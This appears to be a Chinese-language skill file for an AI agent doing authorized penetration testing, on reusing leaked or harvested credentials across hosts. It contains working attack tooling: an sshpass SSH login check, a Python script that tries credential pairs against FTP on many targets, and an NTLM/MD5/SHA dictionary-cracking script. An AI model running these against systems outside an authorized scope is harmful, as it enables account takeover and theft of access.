---
name: credential-stuffing
description: Reuse of already-obtained credentials and pair material — building username:password pairs from leaked lists, configuration files, prior task artifacts or partial knowledge, testing reuse across hosts and services without exploding into a cartesian product, and minimising and de-duplicating validity checks. Use when some credential material already exists and the question is where else it works, or when only one half of the pair is known (accounts without passwords, or a password without accounts). Do not use it for guessing unknown credentials from scratch (see password-attack) or for offline hash cracking.
license: MIT
compatibility: Requires bash, curl, and Python 3 stdlib. Works with the credentials tooling provided by the runtime.
allowed-tools: Bash Read Write Edit Glob Grep
metadata:
  user-invocable: "false"
---

# 凭据复用与填充

## 一、先明确"已知的是哪一半"

这是决定方法的第一步，写在结论里：

| 已知 | 未知 | 方法 |
|---|---|---|
| user:pass 配对 | 哪些主机/服务接受它 | 复用测试（本技能主体） |
| 只有账号列表 | 口令 | 密码喷洒（少量常见口令 × 多账号），见 `password-attack` |
| 只有口令 | 账号 | 单口令 × 账号字典，先做账号枚举 |
| 账号 + 一个旧口令 | 新口令 | 按改密规则派生（年份、`!`、`@123`），候选数要小 |
| 哈希 | 明文 | 离线校验，见下文第四节 |

## 二、构建配对集

配对来源按可信度排序：

1. **上游 Task 的凭据 artifact / 凭据存储**——已经验证过有效的，先复用。
2. **目标自身的配置材料**（材料里给出的配置文件、连接串、`.env`、备份、日志）。这类材料里的配对通常直接可用。
3. **泄露线索**（用户提供或已确认的泄露材料）。**未验证前只能当候选**，不能当已确认凭据写入结论。
4. **同一环境的命名/口令规则推导**（例如观察到 `svc_web` / `svc_db` 这种服务账号命名）。

规范化与去重纪律：

```bash
# 去重、去掉空行与注释、统一分隔符
tr -d '\r' < raw.txt | sed 's/#.*//' | grep -v '^[[:space:]]*$' \
  | awk -F'[:|, ]+' 'NF>=2 {print $1":"$2}' | sort -u > pairs.txt
wc -l pairs.txt      # 规模必须写进证据
```

**不要做账号 × 口令的笛卡尔积。** 那是爆破，不是填充：`pairs.txt` 的行数就是尝试次数，配对集里混入笛卡尔积会让尝试量爆炸并触发锁定。

## 三、复用测试的顺序与范围

先用**最小值**验证，确认有效再扩展：

1. **同主机同服务**：材料给出的入口本身。
2. **同主机的常见兄弟入口**：SSH、数据库、管理面板（用 `nmap -sV` 确认服务存在再试，不要凭端口猜）。
3. **同网段的其他主机**：只有在授权 Scope 覆盖时才做，且必须先有"这台机器的凭据在另一台上也应该有效"的可陈述理由（同一镜像、同一域、同一部署批次）。

每台主机/服务只做**一轮**配对测试，同一对凭据对同一目标不重复验证。

```bash
# SSH 复用快速验证（sshpass 已安装），失败也要打印信号
sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  USER@TARGET 'id' 2>&1 | head -3
```

批量验证时**保留每条尝试的判定信号**（成功/失败/连接错误/账号锁定），不要只输出命中项：

```python
#!/usr/bin/env python3
"""配对集对多目标的复用验证骨架。每行输出一条可复核信号。"""
import ftplib, socket, sys

pairs = [line.strip().split(":", 1) for line in open("pairs.txt", encoding="utf-8") if ":" in line]
targets = [line.strip() for line in open("targets.txt", encoding="utf-8") if line.strip()]

for target in targets:
    for user, password in pairs:
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, 21, timeout=8)
            ftp.login(user, password)
            print(f"[HIT] ftp://{target} {user}:{password}")
            ftp.quit()
        except ftplib.error_perm as err:          # 明确的认证失败
            print(f"[miss] ftp://{target} {user}:{password} {err}")
        except (socket.timeout, OSError) as err:  # 连接层问题：不是"排除了该凭据"
            print(f"[net] ftp://{target} {user}:{password} {err}")
```

区分 `[miss]` 与 `[net]` 很重要：连接失败**不能**用来排除凭据。

## 四、离线哈希材料

本环境**没有 hashcat / john**，只能用 python3 `hashlib` 做字典比对：

```python
#!/usr/bin/env python3
"""离线字典比对。先估算规模：len(wordlist) * hashes 必须能在预算内跑完。"""
import hashlib, sys

ALGOS = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}

def ntlm(password: str) -> str:
    return hashlib.new("md4", password.encode("utf-16-le")).hexdigest()

def digest(algo: str, password: str) -> str:
    return ntlm(password) if algo == "ntlm" else ALGOS[algo](password.encode()).hexdigest()

algo, hash_file, wordlist = sys.argv[1], sys.argv[2], sys.argv[3]
targets = {line.strip().lower() for line in open(hash_file, encoding="utf-8") if line.strip()}
print(f"[info] algo={algo} hashes={len(targets)} wordlist={sum(1 for _ in open(wordlist, encoding='utf-8'))}")
for word in open(wordlist, encoding="utf-8"):
    word = word.strip()
    if not word:
        continue
    candidate = digest(algo, word)
    if candidate in targets:
        print(f"[HIT] {candidate} <- {word}")
        targets.discard(candidate)
        if not targets:
            break
print(f"[info] unresolved={len(targets)}")
```

**先算规模再跑**：字典行数 × 哈希数就是要做的摘要次数。跑不完就如实报告"当前环境在预算内无法完成"，不要把"跑了 3 分钟"写成"排除了该口令空间"。

## 五、结论与交接

- 每条可用凭据都要写成：目标、服务、账号、来源（哪份材料/哪次验证）、证据引用。
- 明确区分三类结论：**已验证有效**、**候选但未验证**、**已排除**（并给出排除依据）。
- 凭据写入凭据存储并引用 artifact；不要把明文口令散落在多个 Artifact 里。
- 复用测试同样受锁定与限速约束：命中后不要继续对同一目标加压。
